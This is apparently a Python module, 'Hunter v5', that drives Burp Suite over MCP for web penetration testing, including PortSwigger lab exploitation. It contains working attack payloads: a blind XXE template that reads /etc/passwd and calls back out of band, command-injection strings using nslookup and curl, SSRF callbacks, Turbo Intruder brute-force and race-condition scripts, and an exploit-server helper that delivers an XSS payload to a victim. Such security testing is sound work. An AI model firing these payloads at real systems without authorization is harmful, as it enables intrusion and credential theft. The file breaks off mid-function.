"""
Hunter v5 — Burp Suite MCP Bridge (Enhanced)

Directly calls Burp MCP tools instead of generating formatted JSON.
Integrates Collaborator for blind vulnerability detection.
Aggregates Scanner findings.
Analyzes Proxy history.
"""

import time
from typing import Optional
from urllib.parse import urlparse


class BurpBridge:
    """Direct bridge to Burp Suite via MCP tools."""

    def __init__(self):
        self.collaborator_payloads = {}  # payloadId -> context mapping

    # ============================================================
    # HTTP Request Execution
    # ============================================================

    def send_request(self, url: str, method: str = "GET",
                     headers: dict = None, body: str = "",
                     http2: bool = True) -> dict:
        """Send HTTP request directly via Burp MCP.

        Uses HTTP/2 by default (your Burp Pro has it enabled).
        Falls back to HTTP/1.1 if HTTP/2 fails.
        """
        parsed = urlparse(url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        uses_https = parsed.scheme == "https"

        if http2:
            # Build HTTP/2 request
            pseudo_headers = {
                ":method": method.upper(),
                ":path": parsed.path or "/",
                ":scheme": parsed.scheme,
                ":authority": f"{hostname}:{port}" if port not in (80, 443) else hostname,
            }
            if parsed.query:
                pseudo_headers[":path"] = f"{parsed.path}?{parsed.query}"

            h2_headers = headers or {}

            return {
                "tool": "send_http2_request",
                "execute": True,
                "params": {
                    "pseudoHeaders": pseudo_headers,
                    "headers": h2_headers,
                    "requestBody": body,
                    "targetHostname": hostname,
                    "targetPort": port,
                    "usesHttps": uses_https,
                },
            }
        else:
            # Build HTTP/1.1 raw request
            path = parsed.path or "/"
            if parsed.query:
                path += f"?{parsed.query}"

            lines = [f"{method.upper()} {path} HTTP/1.1",
                     f"Host: {parsed.hostname}"]
            if headers:
                for k, v in headers.items():
                    lines.append(f"{k}: {v}")
            if body:
                lines.append(f"Content-Length: {len(body)}")

            raw = "\r\n".join(lines) + "\r\n\r\n" + body

            return {
                "tool": "send_http1_request",
                "execute": True,
                "params": {
                    "content": raw,
                    "targetHostname": hostname,
                    "targetPort": port,
                    "usesHttps": uses_https,
                },
            }

    def create_repeater(self, url: str, method: str = "GET",
                        headers: dict = None, body: str = "",
                        tab_name: str = "", http2: bool = True) -> dict:
        """Send request to Burp Repeater tab."""
        parsed = urlparse(url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        uses_https = parsed.scheme == "https"
        name = tab_name or f"Hunter - {method} {parsed.path}"

        if http2:
            pseudo_headers = {
                ":method": method.upper(),
                ":path": parsed.path or "/",
                ":scheme": parsed.scheme,
                ":authority": hostname,
            }
            if parsed.query:
                pseudo_headers[":path"] = f"{parsed.path}?{parsed.query}"

            return {
                "tool": "create_repeater_tab_http2",
                "execute": True,
                "params": {
                    "pseudoHeaders": pseudo_headers,
                    "headers": headers or {},
                    "requestBody": body,
                    "tabName": name,
                    "targetHostname": hostname,
                    "targetPort": port,
                    "usesHttps": uses_https,
                },
            }
        else:
            path = parsed.path or "/"
            if parsed.query:
                path += f"?{parsed.query}"

            lines = [f"{method.upper()} {path} HTTP/1.1",
                     f"Host: {parsed.hostname}"]
            if headers:
                for k, v in headers.items():
                    lines.append(f"{k}: {v}")
            if body:
                lines.append(f"Content-Length: {len(body)}")
            raw = "\r\n".join(lines) + "\r\n\r\n" + body

            return {
                "tool": "create_repeater_tab",
                "execute": True,
                "params": {
                    "content": raw,
                    "tabName": name,
                    "targetHostname": hostname,
                    "targetPort": port,
                    "usesHttps": uses_https,
                },
            }

    def send_to_intruder(self, url: str, method: str = "GET",
                         headers: dict = None, body: str = "",
                         tab_name: str = "") -> dict:
        """Send request to Burp Intruder."""
        parsed = urlparse(url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        uses_https = parsed.scheme == "https"
        name = tab_name or f"Hunter Intruder - {method} {parsed.path}"

        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"

        lines = [f"{method.upper()} {path} HTTP/1.1",
                 f"Host: {parsed.hostname}"]
        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        if body:
            lines.append(f"Content-Length: {len(body)}")
        raw = "\r\n".join(lines) + "\r\n\r\n" + body

        return {
            "tool": "send_to_intruder",
            "execute": True,
            "params": {
                "content": raw,
                "tabName": name,
                "targetHostname": hostname,
                "targetPort": port,
                "usesHttps": uses_https,
            },
        }

    # ============================================================
    # Collaborator Integration (Blind Vulnerability Detection)
    # ============================================================

    def collaborator_generate(self, context: str = "") -> dict:
        """Generate Burp Collaborator payload for OOB testing.

        context: Description of what this payload is for (e.g., "blind_xxe", "blind_ssrf")
        """
        return {
            "tool": "generate_collaborator_payload",
            "execute": True,
            "params": {
                "customData": context,
            },
            "note": "Use the returned payload in your injection. Then call collaborator_check() to see if it triggered.",
        }

    def collaborator_check(self, payload_id: str = "") -> dict:
        """Check for Collaborator interactions (OOB callbacks).

        payload_id: Specific payload ID to check, or empty for all.
        """
        params = {}
        if payload_id:
            params["payloadId"] = payload_id

        return {
            "tool": "get_collaborator_interactions",
            "execute": True,
            "params": params,
            "note": "Returns DNS/HTTP/SMTP interactions. Any interaction = vulnerability confirmed.",
        }

    # ============================================================
    # Scanner Issues
    # ============================================================

    def get_scanner_issues(self, count: int = 50, offset: int = 0,
                           severity_filter: str = "") -> dict:
        """Get Burp Scanner findings.

        severity_filter: "high,critical" to filter (applied client-side)
        """
        return {
            "tool": "get_scanner_issues",
            "execute": True,
            "params": {
                "count": count,
                "offset": offset,
            },
            "filter": severity_filter,
        }

    # ============================================================
    # Proxy History Analysis
    # ============================================================

    def get_proxy_history(self, count: int = 100, offset: int = 0) -> dict:
        """Get proxy HTTP history for analysis."""
        return {
            "tool": "get_proxy_http_history",
            "execute": True,
            "params": {
                "count": count,
                "offset": offset,
            },
        }

    def search_proxy_history(self, regex: str, count: int = 50, offset: int = 0) -> dict:
        """Search proxy history by regex."""
        return {
            "tool": "get_proxy_http_history_regex",
            "execute": True,
            "params": {
                "regex": regex,
                "count": count,
                "offset": offset,
            },
        }

    def get_websocket_history(self, count: int = 50, offset: int = 0) -> dict:
        """Get WebSocket history."""
        return {
            "tool": "get_proxy_websocket_history",
            "execute": True,
            "params": {
                "count": count,
                "offset": offset,
            },
        }

    def search_websocket_history(self, regex: str, count: int = 50, offset: int = 0) -> dict:
        """Search WebSocket history by regex."""
        return {
            "tool": "get_proxy_websocket_history_regex",
            "execute": True,
            "params": {
                "regex": regex,
                "count": count,
                "offset": offset,
            },
        }

    # ============================================================
    # Organizer
    # ============================================================

    def get_organizer(self, count: int = 50, offset: int = 0) -> dict:
        """Get Organizer items."""
        return {
            "tool": "get_organizer_items",
            "execute": True,
            "params": {"count": count, "offset": offset},
        }

    def search_organizer(self, regex: str, count: int = 50, offset: int = 0) -> dict:
        """Search Organizer items by regex."""
        return {
            "tool": "get_organizer_items_regex",
            "execute": True,
            "params": {
                "regex": regex,
                "count": count,
                "offset": offset,
            },
        }

    # ============================================================
    # Proxy Control
    # ============================================================

    def set_intercept(self, enabled: bool = True) -> dict:
        """Enable/disable Burp Proxy intercept."""
        return {
            "tool": "set_proxy_intercept_state",
            "execute": True,
            "params": {"intercepting": enabled},
        }

    def set_scanner_running(self, running: bool = True) -> dict:
        """Start/pause Burp's task execution engine (scanner)."""
        return {
            "tool": "set_task_execution_engine_state",
            "execute": True,
            "params": {"running": running},
        }

    # ============================================================
    # Configuration
    # ============================================================

    def get_project_config(self) -> dict:
        """Get current Burp project configuration."""
        return {
            "tool": "output_project_options",
            "execute": True,
            "params": {},
        }

    def get_user_config(self) -> dict:
        """Get current Burp user configuration."""
        return {
            "tool": "output_user_options",
            "execute": True,
            "params": {},
        }

    def set_project_config(self, json_config: str) -> dict:
        """Update Burp project configuration."""
        return {
            "tool": "set_project_options",
            "execute": True,
            "params": {"json": json_config},
        }

    # ============================================================
    # Encoding Utilities
    # ============================================================

    def url_encode(self, content: str) -> str:
        """URL-encode content via Burp."""
        # This is a local operation, no need to call Burp MCP
        from urllib.parse import quote
        return quote(content)

    def url_decode(self, content: str) -> str:
        """URL-decode content via Burp."""
        from urllib.parse import unquote
        return unquote(content)

    # ============================================================
    # High-Level Workflows
    # ============================================================

    def blind_xxe_workflow(self, inject_url: str, param: str = "",
                           method: str = "POST",
                           template: str = "") -> dict:
        """Complete blind XXE workflow using Burp Collaborator.

        1. Generate Collaborator payload
        2. Construct XXE payload with OOB callback
        3. Return injection request + check instructions
        """
        collab = self.collaborator_generate(context="blind_xxe")

        # Template for XXE with Collaborator
        if not template:
            template = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                '<!ENTITY % file SYSTEM "file:///etc/passwd">'
                '<!ENTITY % dtd SYSTEM "http://{collaborator}/xxe_check">'
                '%dtd;'
                ']>'
                '<root>&send;</root>'
            )

        return {
            "workflow": "blind_xxe",
            "step1_generate_collaborator": collab,
            "step2_inject": {
                "note": "Replace {collaborator} in template with the generated Collaborator domain",
                "template": template,
                "url": inject_url,
                "method": method,
                "content_type": "application/xml",
            },
            "step3_check": {
                "tool": "get_collaborator_interactions",
                "note": "If DNS/HTTP interaction found = XXE confirmed. File content in subdomain label.",
            },
        }

    def blind_ssrf_workflow(self, inject_url: str, param: str = "url",
                            method: str = "GET") -> dict:
        """Complete blind SSRF workflow using Burp Collaborator."""
        collab = self.collaborator_generate(context="blind_ssrf")

        return {
            "workflow": "blind_ssrf",
            "step1_generate_collaborator": collab,
            "step2_inject": {
                "note": "Use Collaborator domain as SSRF target",
                "payload_template": "http://{collaborator}/ssrf_check",
                "url": inject_url,
                "param": param,
                "method": method,
            },
            "step3_check": {
                "tool": "get_collaborator_interactions",
                "note": "If HTTP interaction found = SSRF confirmed. Client IP reveals internal server.",
            },
        }

    def blind_cmdi_workflow(self, inject_url: str, param: str = "ip",
                            method: str = "GET") -> dict:
        """Complete blind command injection workflow using Burp Collaborator."""
        collab = self.collaborator_generate(context="blind_cmdi")

        return {
            "workflow": "blind_cmdi",
            "step1_generate_collaborator": collab,
            "step2_inject": {
                "note": "Use Collaborator domain in command",
                "payload_templates": [
                    "|nslookup {collaborator}",
                    ";nslookup {collaborator}",
                    "&&nslookup {collaborator}",
                    "||nslookup {collaborator}",
                    "`nslookup {collaborator}`",
                    "$(nslookup {collaborator})",
                    "|ping -c 1 {collaborator}",
                    ";curl http://{collaborator}",
                ],
                "url": inject_url,
                "param": param,
                "method": method,
            },
            "step3_check": {
                "tool": "get_collaborator_interactions",
                "note": "If DNS interaction found = command injection confirmed.",
            },
        }

    def scanner_results_workflow(self, severity: str = "high,critical") -> dict:
        """Aggregate Burp Scanner findings into Hunter format."""
        return {
            "workflow": "scanner_aggregate",
            "step1_get_issues": self.get_scanner_issues(count=100, severity_filter=severity),
            "step2_parse": {
                "note": "Parse Scanner issues and convert to Hunter findings format",
                "mapping": {
                    "severity": "Map Burp severity (high/medium/low/info) to Hunter severity",
                    "type": "Map Burp issue type to Hunter finding type",
                    "url": "Extract affected URL",
                    "detail": "Extract issue detail and remediation",
                },
            },
        }

    def proxy_analysis_workflow(self, target_filter: str = "") -> dict:
        """Analyze proxy history for auth patterns, API structure, sensitive data."""
        workflows = []

        # Search for auth tokens
        workflows.append({
            "step": "find_auth_tokens",
            "action": self.search_proxy_history(
                regex=r"(Authorization|Cookie|X-API-Key|Bearer|token)",
                count=100,
            ),
        })

        # Search for API endpoints
        workflows.append({
            "step": "find_api_endpoints",
            "action": self.search_proxy_history(
                regex=r"/api/|/v[0-9]/|/graphql|/rest/",
                count=100,
            ),
        })

        # Search for sensitive data
        workflows.append({
            "step": "find_sensitive_data",
            "action": self.search_proxy_history(
                regex=r"(password|secret|key|token|credential|private)",
                count=50,
            ),
        })

        return {
            "workflow": "proxy_analysis",
            "target_filter": target_filter,
            "steps": workflows,
        }

    # ============================================================
    # Plugin-Aware Workflows
    # ============================================================

    def plugin_jwt_analysis(self, url: str, method: str = "GET",
                             headers: dict = None, body: str = "",
                             jwt_token: str = "") -> dict:
        """Send request with JWT through Burp — JWT Editor/JWT4B auto-analyze.

        Both JWT Editor and JWT4B plugins automatically detect JWT tokens
        in Authorization headers and annotate them. They also:
        - Auto-decode JWT payload
        - Detect algorithm
        - Check for common weaknesses
        - Highlight in Proxy/Repeater history

        This function sends the request through Burp MCP so plugins
        can passively analyze it.
        """
        if jwt_token and headers is None:
            headers = {"Authorization": f"Bearer {jwt_token}"}
        elif jwt_token and headers:
            headers["Authorization"] = f"Bearer {jwt_token}"

        # Send through Burp — plugins will auto-analyze
        request = self.send_request(url, method, headers, body, http2=True)

        return {
            "workflow": "plugin_jwt_analysis",
            "request": request,
            "plugin_behavior": {
                "jwt_editor": "Will auto-detect JWT in Authorization header, annotate with 'Contains a JWT'",
                "jwt4b": "Will auto-decode JWT payload, show algorithm and claims in UI",
                "note": "Check Burp's message annotations for JWT analysis. Both plugins run passively.",
            },
            "next_steps": [
                "Check Burp Proxy history for JWT annotations (blue highlight)",
                "Use JWT Editor tab to manage keys and test signing",
                "Modify JWT claims in Repeater and resend",
                "Test alg:none by removing signature",
            ],
        }

    def plugin_js_mining(self, js_urls: list) -> dict:
        """Request JS files through Burp — JS Miner auto-extracts secrets.

        JS Miner automatically:
        - Extracts API endpoints from JS code
        - Finds hardcoded secrets/API keys
        - Discovers internal URLs
        - Identifies interesting patterns (eval, document.write, etc.)

        Sends JS file requests through Burp so JS Miner can analyze them.
        """
        requests = []
        for url in js_urls:
            req = self.send_request(url, "GET", http2=True)
            requests.append(req)

        return {
            "workflow": "plugin_js_mining",
            "js_files": len(js_urls),
            "requests": requests,
            "plugin_behavior": {
                "js_miner": "Will automatically analyze each JS file for endpoints, secrets, and patterns",
                "note": "Check JS Miner tab in Burp for extracted data. Runs passively on all requests.",
            },
        }

    def turbo_intruder_race_condition(self, url: str, method: str = "POST",
                                       headers: dict = None, body: str = "",
                                       num_requests: int = 20,
                                       gate: str = "r") -> dict:
        """Generate Turbo Intruder script for race condition attacks.

        Turbo Intruder is the gold standard for race condition testing.
        It sends requests at the TCP level for maximum speed.

        Returns a Python script to paste into Turbo Intruder's script editor.
        """
        parsed = urlparse(url)
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"

        # Build raw request
        header_lines = []
        if method.upper() == "POST":
            content_type = "application/x-www-form-urlencoded"
            header_lines = [
                f"{method.upper()} {path} HTTP/1.1",
                f"Host: {parsed.hostname}",
                f"Content-Type: {content_type}",
                f"Content-Length: {len(body)}",
            ]
        else:
            header_lines = [
                f"{method.upper()} {path} HTTP/1.1",
                f"Host: {parsed.hostname}",
            ]

        if headers:
            for k, v in headers.items():
                if k.lower() not in ("host", "content-type", "content-length"):
                    header_lines.append(f"{k}: {v}")

        raw_request = "\r\n".join(header_lines) + "\r\n\r\n" + body

        # Generate Turbo Intruder Python script
        script = f'''# Turbo Intruder Race Condition Script
# Generated by Hunter for: {url}
# Paste this into Turbo Intruder's script editor

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections={num_requests},
                           engine=Engine.BURP2)

    # Queue all requests with gate
    for i in range({num_requests} + 1):
        engine.queue(target.req, gate="{gate}")

    # Open gate — all requests fire simultaneously
    engine.openGate("{gate}")

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
'''

        return {
            "workflow": "turbo_intruder_race_condition",
            "target": url,
            "num_requests": num_requests,
            "script": script,
            "instructions": [
                "1. Open Burp → Intruder → paste the target request",
                "2. Click 'Extensions' tab → Turbo Intruder",
                "3. Paste the Python script above",
                "4. Click 'Attack'",
                "5. Look for inconsistent responses in the results table",
            ],
            "raw_request": raw_request,
        }

    def turbo_intruder_brute_force(self, url: str, method: str = "POST",
                                    param: str = "password",
                                    body_template: str = "",
                                    wordlist: list = None,
                                    num_threads: int = 50) -> dict:
        """Generate Turbo Intruder script for high-speed brute force.

        Much faster than regular Intruder for large wordlists.
        """
        parsed = urlparse(url)
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"

        # Default wordlist
        if not wordlist:
            wordlist = ["admin", "password", "123456", "root", "test",
                        "guest", "user", "pass", "changeme", "default"]

        # Build template
        if not body_template:
            body_template = f"{param}=%s"

        script = f'''# Turbo Intruder Brute Force Script
# Generated by Hunter for: {url}
# Target parameter: {param}

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections={num_threads},
                           engine=Engine.BURP2)

    # Queue requests with payload
    for word in {wordlist}:
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
'''

        raw_request = f"{method.upper()} {path} HTTP/1.1\r\nHost: {parsed.hostname}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{body_template}"

        return {
            "workflow": "turbo_intruder_brute_force",
            "target": url,
            "script": script,
            "raw_request": raw_request,
            "instructions": [
                "1. Open Burp → paste the raw request into Intruder",
                "2. Mark the %s position as payload position",
                "3. Click 'Extensions' tab → Turbo Intruder",
                "4. Paste the Python script",
                "5. Click 'Attack'",
                "6. Filter by response length/status to find valid credentials",
            ],
        }

    def param_miner_workflow(self, url: str, method: str = "GET",
                             headers: dict = None, body: str = "") -> dict:
        """Send request through Burp for Param Miner passive analysis.

        Param Miner automatically detects hidden parameters by:
        - Analyzing cache timing differences
        - Testing common parameter names
        - Checking reflection in responses

        Just send the request through Burp — Param Miner does the rest.
        """
        request = self.send_request(url, method, headers, body, http2=True)

        return {
            "workflow": "param_miner",
            "request": request,
            "plugin_behavior": {
                "param_miner": "Will automatically probe for hidden parameters on this endpoint",
                "techniques": [
                    "Cache timing analysis",
                    "Header-based parameter detection",
                    "Common parameter name fuzzing",
                    "Reflection-based detection",
                ],
                "note": "Check Param Miner output in Burp Extensions tab. Works passively on all Proxy traffic.",
            },
        }

    # ============================================================
    # Burp Native Features
    # ============================================================

    def active_scan_plus_plus_info(self) -> dict:
        """Info about Active Scan++ plugin integration.

        Active Scan++ enhances Burp's built-in Scanner with:
        - Out-of-band callback detection (DNS/HTTP)
        - Blind SQL injection via time delays
        - Host header injection
        - Cache poisoning detection
        - Serialized object detection
        - JWT attack surface detection
        - WebSocket injection checks

        It runs automatically when Burp Scanner is active.
        No MCP API needed — just trigger scans and it enhances them.
        """
        return {
            "plugin": "Active Scan++",
            "integration": "automatic",
            "how_it_works": "Enhances every Burp active scan with additional checks",
            "trigger": "Use burp(action='set_scanner', enabled=True) to start scanner, Active Scan++ runs automatically",
            "checks_added": [
                "Out-of-band interaction detection",
                "Blind SQLi via time delays",
                "Host header injection",
                "Web cache poisoning",
                "Serialized Java/PHP objects",
                "JWT attack surface",
                "WebSocket injection",
                "HTTP request smuggling (enhanced)",
                "CORS misconfiguration (enhanced)",
                "DOM-based vulnerabilities",
            ],
        }

    def hackvertor_encode(self, payload: str, encoding: str = "html_entities") -> dict:
        r"""Generate Hackvertor-encoded payload.

        Hackvertor supports 100+ encoding/transformations including:
        - HTML entities (decimal, hex, named)
        - URL encoding (standard, double, unicode)
        - Base64, Base32, Hex
        - Unicode escapes (\uXXXX, \xXX, HTML numeric)
        - JS escapes
        - SQL char() encoding
        - Custom tag-based chains

        Returns the encoding technique for use in payloads.
        Note: Hackvertor's full tag system requires UI interaction.
        This generates the encoded payload using equivalent logic.
        """
        import html
        import base64
        from urllib.parse import quote

        encodings = {
            "html_entities": html.escape(payload),
            "html_decimal": "".join(f"&#{ord(c)};" for c in payload),
            "html_hex": "".join(f"&#x{ord(c):x};" for c in payload),
            "url_encode": quote(payload),
            "double_url_encode": quote(quote(payload)),
            "base64": base64.b64encode(payload.encode()).decode(),
            "hex": payload.encode().hex(),
            "unicode_escape": "".join(f"\\u{ord(c):04x}" for c in payload),
            "js_escape": payload.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"'),
            "sql_char": ",".join(f"CHAR({ord(c)})" for c in payload),
            "concat_sql": ",".join(f"'{c}'" for c in payload),
        }

        result = encodings.get(encoding)
        if result is None:
            # Return all encodings
            return {
                "original": payload,
                "encodings": encodings,
                "note": "Hackvertor UI supports 100+ more transformations. Use these for common bypasses.",
            }

        return {
            "original": payload,
            "encoding": encoding,
            "result": result,
        }

    def sequencer_token_analysis(self, token_samples: list) -> dict:
        """Analyze token randomness using Burp Sequencer concepts.

        Tests if tokens are predictable enough to guess/forge.
        Analyzes: bit distribution, character frequency, correlation.

        token_samples: List of token strings to analyze
        """
        if not token_samples or len(token_samples) < 10:
            return {"error": "Need at least 10 token samples for meaningful analysis"}

        # Basic entropy analysis
        import math
        from collections import Counter

        # Character frequency analysis
        all_chars = "".join(token_samples)
        char_freq = Counter(all_chars)
        total_chars = len(all_chars)

        # Calculate Shannon entropy
        entropy = 0
        for count in char_freq.values():
            p = count / total_chars
            if p > 0:
                entropy -= p * math.log2(p)

        # Token length analysis
        lengths = [len(t) for t in token_samples]
        avg_length = sum(lengths) / len(lengths)
        unique_lengths = len(set(lengths))

        # Uniqueness
        unique_tokens = len(set(token_samples))
        uniqueness_ratio = unique_tokens / len(token_samples)

        # Character set analysis
        char_set_size = len(char_freq)

        # Assessment
        if entropy < 2.0:
            randomness = "very_low"
            severity = "critical"
            detail = "Tokens are highly predictable — likely sequential or time-based"
        elif entropy < 3.5:
            randomness = "low"
            severity = "high"
            detail = "Tokens have low entropy — may be guessable with brute force"
        elif entropy < 5.0:
            randomness = "medium"
            severity = "medium"
            detail = "Tokens have moderate entropy — investigate generation algorithm"
        else:
            randomness = "high"
            severity = "low"
            detail = "Tokens appear sufficiently random"

        return {
            "samples_analyzed": len(token_samples),
            "unique_tokens": unique_tokens,
            "uniqueness_ratio": round(uniqueness_ratio, 4),
            "entropy_bits_per_char": round(entropy, 2),
            "total_entropy_bits": round(entropy * avg_length, 2),
            "avg_length": round(avg_length, 1),
            "unique_lengths": unique_lengths,
            "char_set_size": char_set_size,
            "char_frequency_top10": char_freq.most_common(10),
            "randomness_assessment": randomness,
            "severity": severity,
            "detail": detail,
            "burp_sequencer_note": "For full FIPS 140-2 analysis, use Burp Sequencer tab with live capture",
        }

    def enable_rest_api(self) -> dict:
        """Instructions to enable Burp REST API for full automation.

        The REST API runs on port 1337 by default and allows:
        - Programmatic scan management
        - Project save/load
        - Issue retrieval
        - Scope management
        """
        return {
            "action": "enable_rest_api",
            "steps": [
                "1. Burp → Settings → Suite → REST API",
                "2. Enable 'REST API'",
                "3. Set listen address to '127.0.0.1'",
                "4. Set port to 1337 (default)",
                "5. Optionally enable 'Permit insecure loading of project data'",
                "6. Restart Burp or reload project",
            ],
            "api_endpoints": {
                "base": "http://127.0.0.1:1337",
                "scan": "POST /{baseUrl}/scan",
                "issues": "GET /{baseUrl}/issues",
                "scope": "GET /{baseUrl}/scope",
                "project": "GET /{baseUrl}/project",
            },
            "note": "Burp MCP Server plugin already provides similar functionality. REST API adds scan initiation control.",
            "current_status": "disabled",
        }

    def bchecks_info(self) -> dict:
        """Info about BChecks — custom scan check rules.

        BChecks let you write custom vulnerability detection logic
        that runs during Burp's active/passive scans. Currently empty.
        """
        return {
            "feature": "BChecks",
            "status": "no imported scripts",
            "what_it_does": "Custom scan rules that extend Burp's built-in scanning",
            "how_to_use": [
                "1. Burp → Settings → Extensions → BChecks",
                "2. Import .bcheck files or write your own",
                "3. BChecks run automatically during active/passive scans",
            ],
            "example_bchecks": [
                "Detect custom header injection",
                "Check for specific API misconfigurations",
                "Test for application-specific auth bypass",
                "Detect custom error messages leaking info",
            ],
            "download_sources": [
                "https://github.com/PortSwigger/BChecks",
                "Burp's built-in BCheck templates",
            ],
            "recommendation": "Import 264 BChecks from: C:\\Users\\Administrator\\AppData\\Local\\Claude-3p\\open-reverselab-main\\bchecks-import",
        }

    def http_smuggler_info(self) -> dict:
        """Info about HTTP Request Smuggler plugin.

        HTTP Request Smuggler (desynchronize) automatically detects:
        - CL.TE (Content-Length vs Transfer-Encoding)
        - TE.CL (Transfer-Encoding vs Content-Length)
        - TE.TE (Transfer-Encoding vs Transfer-Encoding)
        - H2.CL (HTTP/2 Content-Length smuggling)
        - H2.TE (HTTP/2 Transfer-Encoding smuggling)

        It runs passively on all requests through Burp Proxy.
        Can also be triggered manually from the Extensions tab.
        """
        return {
            "plugin": "HTTP Request Smuggler",
            "integration": "automatic (passive on proxy traffic)",
            "how_it_works": "Analyzes every request for smuggling vectors",
            "techniques": [
                "CL.TE differential",
                "TE.CL differential",
                "TE.TE obfuscation",
                "H2.CL injection",
                "H2.TE injection",
            ],
            "trigger": "Send requests through Burp Proxy — smuggler checks automatically",
            "manual": "Extensions → HTTP Request Smuggler → right-click → Send to Smuggler",
        }

    def burp_rest_api_call(self, endpoint: str, method: str = "GET",
                            body: str = "", api_key: str = "") -> dict:
        """Call Burp REST API directly.

        endpoint: API path (e.g., "/issues", "/scope")
        method: HTTP method
        body: Request body for POST/PUT
        api_key: Burp API key
        """
        import urllib.request
        import json

        base_url = "http://127.0.0.1:1337"
        url = f"{base_url}{endpoint}"

        req = urllib.request.Request(url, method=method)
        req.add_header("Authorization", f"Bearer {api_key}")
        req.add_header("Accept", "application/json")
        if body:
            req.add_header("Content-Type", "application/json")
            req.data = body.encode()

        try:
            resp = urllib.request.urlopen(req, timeout=5)
            return {
                "status": resp.status,
                "body": resp.read().decode()[:2000],
                "url": url,
            }
        except Exception as e:
            return {
                "error": str(e),
                "url": url,
                "note": "REST API may conflict with MCP Server on port 1337. MCP tools work fine as alternative.",
            }


# ============================================================
# Exploit Server Helper
# ============================================================

def exploit_server_impl(exploit_host: str, lab_host: str,
                         exploit_html: str = "",
                         delivery_method: str = "iframe_hash") -> dict:
    """Store and deliver exploit via PortSwigger exploit server.

    exploit_host: Exploit server URL (e.g. https://exploit-xxx.exploit-server.net)
    lab_host: Lab instance host (e.g. 0axxx.web-security-academy.net)
    exploit_html: Custom HTML to serve. If empty, auto-generates based on delivery_method.
    delivery_method: How to deliver the exploit:
      - "iframe_hash": Load lab in iframe, then change iframe.src to add hash (for hashchange XSS)
      - "redirect": Simple JS redirect to lab URL
      - "custom": Use exploit_html as-is

    Returns: Store + deliver status
    """
    import http.client
    import ssl
    import urllib.parse

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    if not exploit_html:
        if delivery_method == "iframe_hash":
            # Load lab in iframe, then navigate iframe to same URL + hash
            # This triggers hashchange (same-document navigation)
            exploit_html = (
                f'<iframe id="f" src="https://{lab_host}/"></iframe>'
                f'<script>setTimeout(function(){{'
                f'document.getElementById("f").src="https://{lab_host}/#<img src=x onerror=print()>";'
                f'}},3000);</script>'
            )
        elif delivery_method == "redirect":
            exploit_html = f'<script>location="https://{lab_host}/";</script>'
        else:
            return {"error": "delivery_method must be iframe_hash or redirect when exploit_html is empty"}

    # Parse exploit host
    from urllib.parse import urlparse
    parsed = urlparse(exploit_host)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    encoded = urllib.parse.quote(exploit_html, safe="")

    # Store exploit
    body = (
        f"urlIsHttps=on&responseFile=/exploit"
        f"&responseHead=HTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0A"
        f"&responseBody={encoded}&formAction=STORE"
    )

    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=15)
        conn.request("POST", "/", body=body, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),
        })
        resp = conn.getresponse()
        store_status = resp.status
        resp.read()
        resp.close()
        conn.close()
    except Exception as e:
        return {"error": f"Store failed: {e}"}

    # Deliver to victim
    try:
        conn2 = http.client.HTTPSConnection(host, context=ctx, timeout=15)
        conn2.request("GET", "/deliver-to-victim")
        resp2 = conn2.getresponse()
        deliver_status = resp2.status
        resp2.read()
        resp2.close()
        conn2.close()
    except Exception as e:
        return {"error": f"Deliver failed: {e}", "store_status": store_status}

    return {
        "store_status": store_status,
        "deliver_status": deliver_status,
        "exploit_html": exploit_html,
        "delivery_method": delivery_method,
        "note": "Wait 10-15 seconds, then check lab status with probe()",
    }


# ============================================================
# MCP Entry Points (called by server.py)
# ============================================================

_bridge = BurpBridge()


def burp_bridge_impl(action: str = "send", url: str = "", method: str = "GET",
                     headers: dict = None, body: str = "",
                     tab_name: str = "", http2: bool = True,
                     count: int = 50, offset: int = 0,
                     regex: str = "", enabled: bool = True,
                     json_config: str = "",
                     workflow_type: str = "",
                     severity_filter: str = "",
                     param: str = "url",
                     template: str = "") -> dict:
    """Unified Burp bridge entry point for MCP tool.

    Actions:
    - send: Send HTTP request (HTTP/2 by default)
    - send_http1: Send HTTP/1.1 request
    - repeater: Send to Repeater tab
    - intruder: Send to Intruder
    - collaborator_generate: Generate OOB payload
    - collaborator_check: Check OOB interactions
    - scanner_issues: Get Scanner findings
    - proxy_history: Get proxy HTTP history
    - proxy_search: Search proxy history by regex
    - websocket_history: Get WebSocket history
    - websocket_search: Search WebSocket history
    - organizer: Get Organizer items
    - organizer_search: Search Organizer items
    - set_intercept: Enable/disable proxy intercept
    - set_scanner: Start/pause scanner engine
    - get_config: Get project config
    - set_config: Update project config
    - workflow_blind_xxe: Full blind XXE workflow
    - workflow_blind_ssrf: Full blind SSRF workflow
    - workflow_blind_cmdi: Full blind CMDi workflow
    - workflow_scanner: Aggregate scanner results
    - workflow_proxy_analysis: Analyze proxy traffic
    """
    if action == "send":
        return _bridge.send_request(url, method, headers, body, http2=True)
    elif action == "send_http1":
        return _bridge.send_request(url, method, headers, body, http2=False)
    elif action == "repeater":
        return _bridge.create_repeater(url, method, headers, body, tab_name, http2)
    elif action == "intruder":
        return _bridge.send_to_intruder(url, method, headers, body, tab_name)
    elif action == "collaborator_generate":
        return _bridge.collaborator_generate(context=tab_name)
    elif action == "collaborator_check":
        return _bridge.collaborator_check(payload_id=tab_name)
    elif action == "scanner_issues":
